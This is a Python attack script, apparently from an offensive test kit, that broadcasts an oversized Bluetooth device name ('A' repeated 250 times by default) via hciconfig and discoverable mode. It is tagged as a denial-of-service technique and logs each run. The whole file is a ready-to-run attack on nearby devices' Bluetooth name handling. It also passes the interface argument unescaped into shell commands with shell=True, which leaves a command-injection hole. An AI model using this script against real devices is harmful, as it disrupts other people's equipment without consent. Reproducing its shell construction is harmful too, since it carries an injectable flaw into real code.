#!/usr/bin/env python3

import os
import subprocess
import argparse
import json
import time
from datetime import datetime

LOG_FILE = "results/bluetooth_name_overflow_log.json"
MITRE_TTP = "T1499.004"

def log(entry):
    os.makedirs("results", exist_ok=True)
    try:
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    except:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def overflow_bluetooth_name(iface, overflow_len=250):
    payload_name = "A" * overflow_len
    cmd = f"hciconfig {iface} name '{payload_name}'"
    subprocess.run(cmd, shell=True, check=False)
    subprocess.run(f"hciconfig {iface} piscan", shell=True)
    time.sleep(10)
    subprocess.run(f"hciconfig {iface} noscan", shell=True)

def main():
    parser = argparse.ArgumentParser(description="Bluetooth Name Overflow Attack")
    parser.add_argument("--iface", default="hci0", help="Bluetooth interface")
    parser.add_argument("--length", type=int, default=250, help="Length of overflow string")
    args = parser.parse_args()

    overflow_bluetooth_name(args.iface, args.length)
    log({
        "timestamp": datetime.utcnow().isoformat(),
        "iface": args.iface,
        "length": args.length,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
